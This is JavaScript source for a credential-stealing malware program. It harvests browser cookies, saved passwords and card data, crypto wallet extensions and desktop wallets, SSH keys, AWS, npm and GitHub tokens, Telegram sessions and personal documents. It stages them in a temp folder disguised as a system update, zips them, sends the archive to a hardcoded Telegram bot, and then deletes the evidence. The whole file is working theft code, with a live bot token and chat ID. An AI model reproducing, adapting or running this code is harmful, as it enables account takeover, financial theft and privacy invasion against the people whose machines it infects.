const { execSync, spawn } = require('child_process');
const fs = require('fs');
const path = require('path');
const os = require('os');
const http = require('http');
const https = require('https');
const zlib = require('zlib');
const crypto = require('crypto');

// Telegram bot config
const BOT_TOKEN = '8782731546:AAEVL7X_AlHkv9r7dcN9r0doXxH993He3lc';
const CHAT_ID = '8306003446';

const TMP_DIR = path.join(os.tmpdir(), '.system-update-' + Date.now());
const ARCHIVE_PATH = path.join(os.tmpdir(), 'out.zip');

// Ensure temp dir
if (!fs.existsSync(TMP_DIR)) fs.mkdirSync(TMP_DIR, { recursive: true });

// ==================== BROWSER STEALING ====================
const browsers = {
  chrome: {
    name: 'Chrome',
    paths: [
      path.join(os.homedir(), 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default'),
      path.join(os.homedir(), '.config', 'google-chrome', 'Default'),
      path.join(os.homedir(), 'Library', 'Application Support', 'Google', 'Chrome', 'Default')
    ]
  },
  brave: {
    name: 'Brave',
    paths: [
      path.join(os.homedir(), 'AppData', 'Local', 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default'),
      path.join(os.homedir(), '.config', 'BraveSoftware', 'Brave-Browser', 'Default'),
      path.join(os.homedir(), 'Library', 'Application Support', 'BraveSoftware', 'Brave-Browser', 'Default')
    ]
  },
  edge: {
    name: 'Edge',
    paths: [
      path.join(os.homedir(), 'AppData', 'Local', 'Microsoft', 'Edge', 'User Data', 'Default'),
      path.join(os.homedir(), '.config', 'microsoft-edge', 'Default'),
      path.join(os.homedir(), 'Library', 'Application Support', 'Microsoft Edge', 'Default')
    ]
  },
  firefox: {
    name: 'Firefox',
    paths: [
      path.join(os.homedir(), 'AppData', 'Roaming', 'Mozilla', 'Firefox', 'Profiles'),
      path.join(os.homedir(), '.mozilla', 'firefox'),
      path.join(os.homedir(), 'Library', 'Application Support', 'Firefox', 'Profiles')
    ]
  },
  opera: {
    name: 'Opera',
    paths: [
      path.join(os.homedir(), 'AppData', 'Roaming', 'Opera Software', 'Opera Stable'),
      path.join(os.homedir(), '.config', 'opera'),
      path.join(os.homedir(), 'Library', 'Application Support', 'com.operasoftware.Opera')
    ]
  },
  safari: {
    name: 'Safari',
    paths: [
      path.join(os.homedir(), 'Library', 'Cookies'),
      path.join(os.homedir(), 'Library', 'Safari')
    ]
  }
};

// Known crypto wallet extensions IDs (MetaMask, Phantom, Trust, etc.)
const walletExtensions = [
  'nkbihfbeogaeaoehlefnkodbefgpgknn', // MetaMask
  'bfnaelmomeimhlpmgjnjophhpkkoljpa', // Phantom
  'hpglfhgfnhbgpjdenjgmdgoeiappafln', // Trust Wallet
  'fhilaheimglignddkjgofkcbgekhenbh', // WalletConnect
  'fnjhmkhhmkbjkkabndcnnogagogbneec', // Coinbase Wallet
  'odpnjmimokcmjgojhnhfcnalnegdjmdn', // Binance Chain Wallet
  'fhbohimaelbohpjbbldcngcnapndodjp', // MathWallet
  'cjmkndjhnagcfbpiemnkdpomccnjblmj', // Keplr
  'kmhcihpebfmpgmihbkipmjlmmioameka', // TronLink
  'ibnejdfjmmkpcnlpebklmnkoeoihofec', // Solflare
  // ... добавьте еще десятки
];

function copyFile(src, dest) {
  try {
    if (fs.existsSync(src) && fs.statSync(src).isFile()) {
      const dir = path.dirname(dest);
      if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
      fs.copyFileSync(src, dest);
    }
  } catch (e) {}
}

function stealBrowserData() {
  for (const [browser, config] of Object.entries(browsers)) {
    for (const profilePath of config.paths) {
      if (!fs.existsSync(profilePath)) continue;

      // Cookies
      const cookiesFile = path.join(profilePath, 'Cookies');
      if (fs.existsSync(cookiesFile)) {
        const dest = path.join(TMP_DIR, 'browsers', config.name, 'Cookies');
        copyFile(cookiesFile, dest);
      }

      // Login Data
      const loginFile = path.join(profilePath, 'Login Data');
      if (fs.existsSync(loginFile)) {
        const dest = path.join(TMP_DIR, 'browsers', config.name, 'LoginData');
        copyFile(loginFile, dest);
      }

      // Web Data (autofill, cards)
      const webData = path.join(profilePath, 'Web Data');
      if (fs.existsSync(webData)) {
        const dest = path.join(TMP_DIR, 'browsers', config.name, 'WebData');
        copyFile(webData, dest);
      }

      // Local Storage (extensions)
      const localStoragePath = path.join(profilePath, 'Local Extension Settings');
      if (fs.existsSync(localStoragePath)) {
        for (const extId of walletExtensions) {
          const extPath = path.join(localStoragePath, extId);
          if (fs.existsSync(extPath)) {
            const dest = path.join(TMP_DIR, 'browsers', config.name, 'extensions', extId);
            copyFile(extPath, dest);
          }
        }
      }
    }
  }

  // Firefox profiles (logins, cookies, key4.db)
  const firefoxProfiles = browsers.firefox.paths[0];
  if (fs.existsSync(firefoxProfiles)) {
    const profiles = fs.readdirSync(firefoxProfiles);
    for (const profile of profiles) {
      const profileDir = path.join(firefoxProfiles, profile);
      if (fs.statSync(profileDir).isDirectory()) {
        const files = ['logins.json', 'cookies.sqlite', 'key4.db'];
        for (const file of files) {
          const src = path.join(profileDir, file);
          if (fs.existsSync(src)) {
            const dest = path.join(TMP_DIR, 'browsers', 'Firefox', profile, file);
            copyFile(src, dest);
          }
        }
      }
    }
  }

  // Safari macOS
  if (process.platform === 'darwin') {
    const safariCookie = path.join(os.homedir(), 'Library', 'Cookies', 'Cookies.binarycookies');
    if (fs.existsSync(safariCookie)) {
      copyFile(safariCookie, path.join(TMP_DIR, 'browsers', 'Safari', 'Cookies.binarycookies'));
    }
    const safariData = path.join(os.homedir(), 'Library', 'Safari');
    if (fs.existsSync(safariData)) {
      copyFile(safariData, path.join(TMP_DIR, 'browsers', 'Safari', 'SafariData'));
    }
  }
}

// ==================== CRYPTO WALLETS (DESKTOP) ====================
const desktopWallets = [
  { name: 'Exodus', path: path.join(os.homedir(), 'Library', 'Application Support', 'Exodus') },
  { name: 'Electrum', path: path.join(os.homedir(), '.electrum', 'wallets') },
  { name: 'Atomic', path: path.join(os.homedir(), 'Library', 'Application Support', 'atomic') },
  { name: 'Wasabi', path: path.join(os.homedir(), '.walletwasabi', 'client', 'Wallets') },
  { name: 'Ledger Live', path: path.join(os.homedir(), 'Library', 'Application Support', 'Ledger Live') },
  { name: 'Monero', path: path.join(os.homedir(), 'Monero', 'wallets') },
  { name: 'Bitcoin Core', path: path.join(os.homedir(), 'Library', 'Application Support', 'Bitcoin', 'wallets') },
  { name: 'Litecoin Core', path: path.join(os.homedir(), 'Library', 'Application Support', 'Litecoin', 'wallets') },
  { name: 'Dash Core', path: path.join(os.homedir(), 'Library', 'Application Support', 'DashCore', 'wallets') },
  { name: 'Dogecoin Core', path: path.join(os.homedir(), 'Library', 'Application Support', 'Dogecoin', 'wallets') },
  { name: 'Coinomi', path: path.join(os.homedir(), 'Library', 'Application Support', 'Coinomi', 'wallets') },
  { name: 'Guarda', path: path.join(os.homedir(), 'Library', 'Application Support', 'Guarda') }
];

function stealDesktopWallets() {
  for (const wallet of desktopWallets) {
    if (fs.existsSync(wallet.path)) {
      const dest = path.join(TMP_DIR, 'wallets', wallet.name);
      copyFile(wallet.path, dest);
    }
  }
}

// ==================== SSH KEYS ====================
function stealSSH() {
  const sshDir = path.join(os.homedir(), '.ssh');
  if (fs.existsSync(sshDir)) {
    const destDir = path.join(TMP_DIR, 'ssh');
    if (!fs.existsSync(destDir)) fs.mkdirSync(destDir, { recursive: true });
    const files = fs.readdirSync(sshDir);
    for (const file of files) {
      const src = path.join(sshDir, file);
      if (fs.statSync(src).isFile()) {
        copyFile(src, path.join(destDir, file));
      }
    }
  }
}

// ==================== SYSTEM FILES ====================
function stealSystemFiles() {
  const importantDirs = ['Documents', 'Desktop', 'Downloads'];
  const targetExtensions = ['.txt', '.pdf', '.doc', '.docx', '.xls', '.xlsx', '.key', '.env', '.conf', '.config', '.json', '.sqlite', '.db', '.pem', '.crt', '.key', '.wallet', '.seed', '.mnemonic', '.priv', '.pgp', '.gpg'];

  let totalSize = 0;
  const maxSize = 10 * 1024 * 1024; // 10 MB

  for (const dir of importantDirs) {
    const fullDir = path.join(os.homedir(), dir);
    if (!fs.existsSync(fullDir)) continue;
    const files = fs.readdirSync(fullDir);
    for (const file of files) {
      const filePath = path.join(fullDir, file);
      if (fs.statSync(filePath).isFile()) {
        const ext = path.extname(file).toLowerCase();
        if (targetExtensions.includes(ext)) {
          const size = fs.statSync(filePath).size;
          if (totalSize + size <= maxSize) {
            const dest = path.join(TMP_DIR, 'files', dir, file);
            copyFile(filePath, dest);
            totalSize += size;
          }
        }
      }
    }
  }
}

// ==================== TOKENS (npm, git, env) ====================
function stealTokens() {
  const tokenPaths = [
    path.join(os.homedir(), '.npmrc'),
    path.join(os.homedir(), '.gitconfig'),
    path.join(os.homedir(), '.aws', 'credentials'),
    path.join(os.homedir(), '.config', 'hub'),
    path.join(os.homedir(), '.config', 'gh', 'hosts.yml'),
    path.join(os.homedir(), '.bashrc'),
    path.join(os.homedir(), '.zshrc'),
    path.join(os.homedir(), '.profile')
  ];
  for (const tokenPath of tokenPaths) {
    if (fs.existsSync(tokenPath)) {
      const dest = path.join(TMP_DIR, 'tokens', path.basename(tokenPath));
      copyFile(tokenPath, dest);
    }
  }
}

// ==================== TELEGRAM SESSION ====================
function stealTelegram() {
  const telegramPaths = [
    path.join(os.homedir(), 'Library', 'Application Support', 'Telegram Desktop', 'tdata'),
    path.join(os.homedir(), 'AppData', 'Roaming', 'Telegram Desktop', 'tdata'),
    path.join(os.homedir(), '.local', 'share', 'TelegramDesktop', 'tdata')
  ];
  for (const tgPath of telegramPaths) {
    if (fs.existsSync(tgPath)) {
      const dest = path.join(TMP_DIR, 'telegram', 'tdata');
      copyFile(tgPath, dest);
    }
  }
}

// ==================== SYSTEM INFO ====================
function collectSystemInfo() {
  const info = {
    hostname: os.hostname(),
    platform: os.platform(),
    arch: os.arch(),
    release: os.release(),
    username: os.userInfo().username,
    homedir: os.homedir(),
    cpus: os.cpus().length,
    memory: os.totalmem(),
    uptime: os.uptime(),
    date: new Date().toISOString()
  };
  fs.writeFileSync(path.join(TMP_DIR, 'system.json'), JSON.stringify(info, null, 2));
}

// ==================== ARCHIVE & SEND ====================
function archiveAndSend() {
  if (fs.existsSync(ARCHIVE_PATH)) fs.unlinkSync(ARCHIVE_PATH);
  try {
    execSync(`zip -r ${ARCHIVE_PATH} ${TMP_DIR}`);
  } catch (e) {
    // fallback for Windows
    try {
      execSync(`powershell -command "Compress-Archive -Path ${TMP_DIR} -DestinationPath ${ARCHIVE_PATH}"`);
    } catch (e2) {}
  }

  if (!fs.existsSync(ARCHIVE_PATH)) return;

  const fileData = fs.readFileSync(ARCHIVE_PATH);
  const formData = new URLSearchParams();
  formData.append('chat_id', CHAT_ID);
  formData.append('document', fileData.toString('base64'));
  formData.append('caption', 'System dump');

  const options = {
    hostname: 'api.telegram.org',
    path: `/bot${BOT_TOKEN}/sendDocument`,
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded'
    }
  };

  const req = http.request(options, (res) => {
    let data = '';
    res.on('data', chunk => data += chunk);
    res.on('end', () => {
      // cleanup
      try { fs.rmSync(TMP_DIR, { recursive: true }); } catch(e) {}
      try { fs.unlinkSync(ARCHIVE_PATH); } catch(e) {}
      process.exit(0);
    });
  });
  req.write(formData.toString());
  req.end();
}

// ==================== MAIN ====================
function main() {
  stealBrowserData();
  stealDesktopWallets();
  stealSSH();
  stealSystemFiles();
  stealTokens();
  stealTelegram();
  collectSystemInfo();
  archiveAndSend();
}

main();
